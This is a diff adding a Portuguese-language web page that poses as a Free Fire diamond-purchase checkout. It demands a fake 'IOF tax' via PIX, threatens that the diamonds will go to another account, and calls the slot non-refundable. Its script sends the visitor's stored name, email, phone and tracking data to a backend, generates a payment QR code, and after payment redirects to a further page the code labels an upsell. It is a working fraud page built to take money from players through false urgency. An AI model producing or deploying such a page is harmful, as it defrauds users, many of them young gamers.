@@ -1,0 +1,300 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Fire - Pagamento de Taxa</title>
+  <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: "Roboto", sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+    }
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+      background: white;
+      min-height: 100vh;
+    }
+    .header {
+      background: #f8f9fa;
+      padding: 10px 20px;
+      border-bottom: 1px solid #e9ecef;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .logo {
+      max-width: 160px;
+    }
+
+    /* Progress container */
+    .progress-container {
+      width: 80%;
+      max-width: 350px;
+      margin: 20px auto;
+      background-color: #e98282;
+      border-radius: 20px;
+      overflow: hidden;
+      position: relative;
+      height: 28px;
+    }
+
+    /* Barra animada */
+    .progress-bar {
+      width: 0;
+      height: 100%;
+      background-color: #f00000;
+      border-radius: 20px;
+      animation: loadProgress 2s forwards;
+      position: relative;
+    }
+
+    /* Texto fixo dentro da barra */
+    .progress-text {
+      position: absolute;
+      width: 100%;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-weight: bold;
+      font-size: 13px;
+    }
+
+    @keyframes loadProgress {
+      from { width: 0; }
+      to { width: 98%; }
+    }
+
+    .pay-button {
+      background: #f00000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 15px 30px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 20px auto;
+      display: block;
+      transition: all 0.3s ease;
+    }
+    .pay-button:hover {
+      background: #c82333;
+      transform: translateY(-2px);
+    }
+
+    .pending-message {
+      text-align: center;
+      color: #555;
+      font-size: 14px;
+      line-height: 1.5;
+      margin: 10px 20px;
+    }
+
+    /* FAQ */
+    .faq {
+      margin-top: 20px;
+      text-align: center;
+      padding: 0 20px;
+    }
+    .faq h3 {
+      color: #f00000;
+      margin-bottom: 10px;
+    }
+    .faq details {
+      margin: 8px 0;
+      font-size: 14px;
+      text-align: left;
+    }
+    .faq summary {
+      color: #f00000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .faq details[open] summary {
+      color: #000;
+    }
+  </style>
+<script async="" defer="" src="js/pixel_1.js"></script>
+<script src="js/utm-capture.js"></script>
+<script async="" defer="" src="js/pixel.js"></script></head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="images/roblox-logo-1.png" class="logo" alt="Logo Garena">
+    </div>
+    
+
+    <div class="banner">
+      <img src="images/banner-loja.jpg" alt="Banner Checkout" style="width:100%; height:auto;">
+    </div>
+    
+    <!-- Barra de carregamento -->
+    <div class="progress-container">
+      <div class="progress-bar"></div>
+      <span class="progress-text">Quase lá... 98%</span>
+    </div>
+
+    <div id="mainContent" style="padding:20px; text-align:center;">
+      <h2 style="color:#a10904; font-weight:bold;">⚠️ ATENÇÃO!</h2>
+      <p style="margin:20px 0; font-size:18px;">
+        Seus diamantes estão garantidos porém temos a taxa IOF sobre compras em jogos online, no valor de 
+        <strong>R$ 14,84</strong> para enviar os diamantes.
+      </p>
+
+      <div style="background:#fff3cd; border:1px solid #ffeaa7; border-radius:8px; padding:15px; margin:20px 0; font-weight:bold;">
+        Caso não pague a taxa os diamantes serão enviados a outra conta que está na fila de pedidos!
+      </div>
+
+      <!-- BOTÃO PARA GERAR PIX -->
+      <button onclick="generateIofPix()" class="pay-button" id="iofBtn">
+        PAGAR TAXA E RECEBER DIAMANTES
+      </button>
+
+      <p style="font-style:italic; color:#f00000;">(Taxa Obrigatória)</p>
+
+      <!-- Texto pendente -->
+      <div class="pending-message">
+        Agora está pendente o pagamento da taxa IOF sobre a compra, e só será
+        possível receber os diamantes após o pagamento dessa taxa.
+      </div>
+
+      <!-- FAQ corrigido -->
+      <div class="faq">
+        <h3>Dúvidas Frequentes</h3>
+
+        <details>
+          <summary>E se eu não pagar a taxa?</summary>
+          <p>O cliente tem até o final do dia após o suporte entrar em contato para pagar. Caso não consiga, perderá sua vaga (VAGA NÃO É REEMBOLSÁVEL).</p>
+        </details>
+
+        <details>
+          <summary>O que acontece após eu pagar?</summary>
+          <p>Após o pagamento, os diamantes serão enviados e você poderá continuar a usar o aplicativo normalmente.</p>
+        </details>
+      </div>
+    </div>
+  </div>
+  
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+  window.pixelId = "6a46d17b31c4349c3fb4f40c";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+
+  // Integração PIX para IOF
+  function generateIofPix() {
+      const btn = document.getElementById('iofBtn');
+      const originalText = btn.innerHTML;
+      btn.innerHTML = 'Aguarde...';
+
+      const utmData = (typeof window.getFFTrackingData === 'function') ? window.getFFTrackingData() : {};
+      fetch('../backend.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+              amount: "14.84",
+              product_type: "iof",
+              tipo: "upsell",
+              nome: localStorage.getItem('ff_nome') || 'Cliente Free Fire',
+              email: localStorage.getItem('ff_email') || 'cliente@exemplo.com',
+              telefone: localStorage.getItem('ff_telefone') || null,
+              utm_source: utmData.utm_source || null,
+              utm_medium: utmData.utm_medium || null,
+              utm_campaign: utmData.utm_campaign || null,
+              utm_content: utmData.utm_content || null,
+              utm_term: utmData.utm_term || null,
+              src: utmData.src || null,
+              sck: utmData.sck || null,
+              fbclid: utmData.fbclid || null,
+              fbc: utmData.fbc || null,
+              fbp: utmData.fbp || null
+          })
+      }).then(res => res.json()).then(data => {
+          btn.innerHTML = originalText;
+          if (data.pix && data.pix.qrcode && data.id) {
+              showPixModal(data.pix.qrcode, data.id);
+          } else {
+              alert('Erro ao processar pagamento da taxa. Tente novamente.');
+          }
+      }).catch(err => {
+          btn.innerHTML = originalText;
+          console.error(err);
+          alert('Erro na requisição. Tente novamente.');
+      });
+  }
+
+  let pollingInterval;
+
+  function showPixModal(pixCode, transactionId) {
+      document.getElementById('pix-qrcode-img').src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
+      document.getElementById('pix-copy-text').value = pixCode;
+      document.getElementById('pix-modal').style.display = 'flex';
+      
+      // Inicia o polling a cada 3 segundos
+      pollingInterval = setInterval(() => {
+          fetch('../check_status.php?id=' + transactionId)
+              .then(res => res.json())
+              .then(data => {
+                  if (data.status === 'paid') {
+    clearInterval(pollingInterval);
+
+    // Redireciona para o novo upsell
+    window.location.href = "../erro/pagamento/";
+}
+              })
+              .catch(console.error);
+      }, 3000);
+  }
+
+  function closePixModal() {
+      if (pollingInterval) clearInterval(pollingInterval);
+      document.getElementById('pix-modal').style.display = 'none';
+  }
+
+  function copyPix() {
+      var copyText = document.getElementById('pix-copy-text');
+      copyText.select();
+      copyText.setSelectionRange(0, 99999);
+      document.execCommand('copy');
+      alert('Código PIX copiado com sucesso!');
+  }
+</script>
+
+  <!-- Modal PIX -->
+  <div id="pix-modal" style="display: none; position: fixed; inset: 0; z-index: 99999; align-items: center; justify-content: center; background: rgba(0, 0, 0, 0.8);">
+      <div style="background: #fff; padding: 24px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; position: relative;">
+          <button onclick="closePixModal()" style="position: absolute; right: 16px; top: 16px; background: none; border: none; font-size: 20px; cursor: pointer; color: #333;">×</button>
+          <h2 style="font-size: 20px; font-weight: bold; color: #333; margin-bottom: 16px;">Pagamento Taxa IOF</h2>
+          <p style="color: #666; margin-bottom: 20px; font-size: 14px;">Escaneie o QR Code abaixo ou copie o código para pagar a taxa de R$ 14,84.</p>
+          
+          <img id="pix-qrcode-img" src="" alt="QR Code PIX" style="width: 200px; height: 200px; margin: 0 auto 20px; display: block; border: 1px solid #eee; padding: 8px; border-radius: 8px;">
+          
+          <div style="display: flex; gap: 8px; margin-bottom: 8px;">
+              <input type="text" id="pix-copy-text" readonly="" style="flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 6px; font-size: 12px; color: #555; background: #f9f9f9;">
+              <button onclick="copyPix()" style="background: #f00000; color: white; border: none; padding: 0 16px; border-radius: 6px; font-weight: bold; cursor: pointer;">Copiar</button>
+          </div>
+          <div style="margin-top: 20px; display: flex; flex-direction: column; align-items: center; gap: 10px;">
+              <div style="width: 24px; height: 24px; border: 3px solid #f3f3f3; border-top: 3px solid #f00000; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+              <p style="color: #f00000; font-weight: bold; font-size: 14px; margin: 0;">Aguardando pagamento...</p>
+          </div>
+          <style>
+              @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+          </style>
+      </div>
+  </div>
+
+
+</body></html>
